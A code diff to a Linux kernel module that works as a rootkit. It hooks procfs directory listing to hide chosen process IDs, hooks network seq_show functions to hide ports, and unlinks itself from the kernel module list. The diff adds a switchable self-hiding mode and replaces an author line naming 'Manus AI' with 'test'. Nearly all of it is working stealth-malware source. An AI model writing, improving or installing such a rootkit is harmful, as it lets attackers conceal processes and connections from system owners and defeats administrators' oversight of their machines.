@@ -20,9 +20,11 @@ static char *hide_pids[MAX_HIDDEN_PIDS];
 static int hide_pids_count = 0;
 static u16 hide_ports[MAX_HIDDEN_PORTS];
 static int hide_ports_count = 0;
+static int self_hide = 0; /* Default: don't hide the module itself for easier debugging */
 
 module_param_array(hide_pids, charp, &hide_pids_count, 0644);
 module_param_array(hide_ports, ushort, &hide_ports_count, 0644);
+module_param(self_hide, int, 0644);
 
 /* --- Process Hiding Logic --- */
 
@@ -53,18 +55,13 @@ static int stealth_actor(struct dir_context *ctx, const char *name, int len,
     struct stealth_dir_context *s_ctx = container_of(ctx, struct stealth_dir_context, ctx);
     int i;
 
-    /* 
-     * Only filter if we are in /proc and the entry name is a hidden PID.
-     * We also ensure the name is numeric to avoid accidental filtering.
-     */
     if (s_ctx->is_proc && len > 0 && isdigit(name[0])) {
         for (i = 0; i < hide_pids_count; i++) {
             if (len == strlen(hide_pids[i]) && strncmp(name, hide_pids[i], len) == 0)
-                return true; /* Skip this entry (true/0 depending on kernel version) */
+                return true; 
         }
     }
 
-    /* Forward to the original actor with the original context */
     s_ctx->orig_ctx->pos = ctx->pos;
     return s_ctx->orig_actor(s_ctx->orig_ctx, name, len, offset, ino, d_type);
 }
@@ -80,9 +77,6 @@ static int fake_iterate_common(struct file *file, struct dir_context *ctx,
         .is_proc = false,
     };
 
-    /* 
-     * Robust check for procfs.
-     */
     if (file && file->f_path.dentry && file->f_path.dentry->d_sb) {
         const char *fs_name = file->f_path.dentry->d_sb->s_type->name;
         if (strcmp(fs_name, "proc") == 0) {
@@ -90,7 +84,6 @@ static int fake_iterate_common(struct file *file, struct dir_context *ctx,
         }
     }
 
-    /* If not in proc, just call the real function with original context to avoid any side effects */
     if (!s_ctx.is_proc) {
         return real_func(file, ctx);
     }
@@ -150,17 +143,20 @@ static int fake_udp4_seq_show(struct seq_file *seq, void *v)
 
 /* --- Module Self-Hiding --- */
 
-static struct list_head *prev_module;
+static struct list_head *prev_module = NULL;
 
 static void hide_module(void)
 {
+    if (prev_module) return;
     prev_module = THIS_MODULE->list.prev;
     list_del(&THIS_MODULE->list);
 }
 
 static void show_module(void)
 {
+    if (!prev_module) return;
     list_add(&THIS_MODULE->list, prev_module);
+    prev_module = NULL;
 }
 
 /* --- Module Setup --- */
@@ -203,17 +199,23 @@ static int __init stealth_init(void)
         pr_warn("Failed to install network hooks, network hiding will be disabled.\n");
     }
     
-    hide_module();
+    if (self_hide) {
+        hide_module();
+        pr_info("Stealth module loaded in HIDDEN mode.\n");
+    } else {
+        pr_info("Stealth module loaded in VISIBLE mode.\n");
+    }
     
-    pr_info("Stealth module loaded. Hiding %d PIDs and %d ports\n", 
-            hide_pids_count, hide_ports_count);
+    pr_info("Hiding %d PIDs and %d ports\n", hide_pids_count, hide_ports_count);
     return 0;
 }
 
 static void __exit stealth_exit(void)
 {
     int i;
-    show_module();
+    if (self_hide) {
+        show_module();
+    }
 
     for (i = 0; i < ARRAY_SIZE(process_hooks); i++) {
         if (process_hooks[i].address)
@@ -228,5 +230,5 @@ static void __exit stealth_exit(void)
 module_init(stealth_init);
 module_exit(stealth_exit);
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Manus AI");
+MODULE_AUTHOR("test");
 MODULE_DESCRIPTION("LKM for hiding processes and network connections on Linux 5.15/6.8");
